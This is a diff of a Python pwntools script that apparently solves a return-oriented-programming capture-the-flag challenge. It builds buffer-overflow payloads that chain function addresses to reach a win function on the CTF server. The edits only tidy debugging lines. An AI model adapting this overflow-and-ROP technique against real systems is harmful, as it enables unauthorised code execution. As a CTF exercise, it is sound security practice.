@@ -27,13 +27,14 @@ towers = 0x0804937c
 # xor    eax,eax
 places = [depot,grove,junction,lodge,lake,shores,towers,win,tryme]
 
-commands = ['b *0x08049713']+['b *{}'.format(hex(n)) for n in places]
+# commands = ['b *0x08049713']+['b *{}'.format(hex(n)) for n in places]
 # p = gdb.debug('./rop', '\n'.join(commands)) 
 # p = process('./rop')
 p = remote('ctf.umbccd.io', 4100)
 
 for place in [towers,junction,shores,grove,lodge,depot]:
-    buf = b'a'*16
+    buf = b''
+    buf += b'a'*16
     buf += p32(place)
     buf += p32(tryme)
     p.send(buf)
@@ -44,4 +45,3 @@ buf += p32(win)
 p.sendline(buf)
 
 p.interactive()
-# print(p.recvall().decode())
